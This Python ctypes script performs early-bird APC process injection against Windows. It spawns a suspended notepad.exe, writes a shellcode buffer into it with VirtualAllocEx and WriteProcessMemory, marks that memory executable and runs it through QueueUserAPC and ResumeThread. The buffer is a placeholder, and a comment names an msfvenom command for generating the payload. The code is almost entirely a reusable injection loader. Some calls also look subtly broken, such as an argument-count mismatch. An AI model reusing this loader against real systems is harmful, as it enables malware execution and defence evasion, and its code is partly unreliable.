"""
process creation and
shellcode execution
"""

from ctypes import *
from ctypes import wintypes
import subprocess

kernel32 = windll.kernel32
SIZE_T = c_size_t
LPTSTR = POINTER(c_char)
LPBYTE = POINTER(c_ubyte)

# refer function definitions from previous script

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [('nLength', wintypes.DWORD),
                ('lpSecurityDescriptor', wintypes.LPVOID),
                ('bInheritHandle', wintypes.BOOL),]

SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

# constants required for memory alloc
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

VirtualProtectEx = kernel32.VirtualProtectEx
VirtualProtectEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.LPDWORD)
VirtualProtectEx.restype = wintypes.BOOL

class STARTUPINFO(Structure):
    _fields_ = [('cb', wintypes.DWORD),
                ('lpReserved', LPTSTR),
                ('lpDesktop', LPTSTR),
                ('lpTitle', LPTSTR),
                ('dwX', wintypes.DWORD),
                ('dwY', wintypes.DWORD),
                ('dwXSize', wintypes.DWORD),
                ('dwYSize', wintypes.DWORD),
                ('dwXCountChars', wintypes.DWORD),
                ('dwYCountChars', wintypes.DWORD),
                ('dwFillAttribute', wintypes.DWORD),
                ('dwFlags', wintypes.DWORD),
                ('wShowWindow', wintypes.WORD),
                ('cbReserved2', wintypes.WORD),
                ('lpReserved2', LPBYTE),
                ('hStdInput', wintypes.HANDLE),
                ('hStdOutput', wintypes.HANDLE),
                ('hStdError', wintypes.HANDLE),]

class PROCESS_INFORMATION(Structure):
    _fields_ = [('hProcess', wintypes.HANDLE),
                ('hThread', wintypes.HANDLE),
                ('dwProcessId', wintypes.DWORD),
                ('dwThreadId', wintypes.DWORD),]

CreateProcessA = kernel32.CreateProcessA
CreateProcessA.argtypes = (wintypes.LPCSTR, wintypes.LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCSTR, POINTER(STARTUPINFO), POINTER(PROCESS_INFORMATION))
CreateProcessA.restype = wintypes.BOOL

# generate shellcode and store in buf variable
# msfvenom -a x64 -p windows/x64/messagebox TITLE=hello TEXT=world -f py
buf = b"insert shellcode"

def verify(x):
    if not x:
        raise WinError()

startup_info = STARTUPINFO()
startup_info.cb = sizeof(startup_info)
startup_info.dwFlags = 1
startup_info.wShowWindow = 1

process_info = PROCESS_INFORMATION()

CREATE_NEW_CONSOLE = 0x00000010
CREATE_NO_WINDOW = 0x08000000
CREATE_SUSPENDED = 0x00000004

created = CreateProcessA(b"C:\\Windows\\System32\\notepad.exe", None, None, None, False, CREATE_SUSPENDED, None, None, byref(startup_info), byref(process_info))
# CREATE_NO_WINDOW can be used as well

verify(created)

# info associated with created process

pid = process_info.dwProcessId
h_process = process_info.hProcess
thread_id = process_info.dwThreadId
h_thread = process_info.hThread

print("Started process - handle: {}, PID: {}, TID: {}".format(h_process, pid, thread_id))

remote_memory = VirtualAllocEx(h_process, False, len(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
verify(remote_memory)
print("Memory allocated - ", hex(remote_memory))

# write shellcode into memory
write = WriteProcessMemory(h_process, remote_memory, buf, len(buf))
verify(write)
print("Bytes written - {}".format(len(buf)))

PAGE_EXECUTE_READ = 0x20
old_protection = wintypes.DWORD(0)
# change memory protection
protect = VirtualProtectEx(h_process, remote_memory, len(buf), PAGE_EXECUTE_READ, byref(old_protection))
verify(protect)
print("Memory protection updated from {} to {}".format(old_protection.value, PAGE_EXECUTE_READ))

# we can use QueueUserAPC instead of CreateRemoteThread
PAPCFUNC = CFUNCTYPE(None, POINTER(wintypes.ULONG))

QueueUserAPC = kernel32.QueueUserAPC
QueueUserAPC.argtypes = (PAPCFUNC, wintypes.HANDLE, POINTER(wintypes.ULONG))
QueueUserAPC.restype = wintypes.BOOL

ResumeThread = kernel32.ResumeThread
ResumeThread.argtypes = (wintypes.HANDLE)
ResumeThread.restype = wintypes.BOOL

rqueue = QueueUserAPC(PAPCFUNC(remote_memory), h_thread, None)
verify(rqueue)
print("Queueing APC thread - {}".format(h_thread))

# change thread status from suspended to running

rthread = ResumeThread(h_thread)
verify(rthread)
print("Resuming thread")
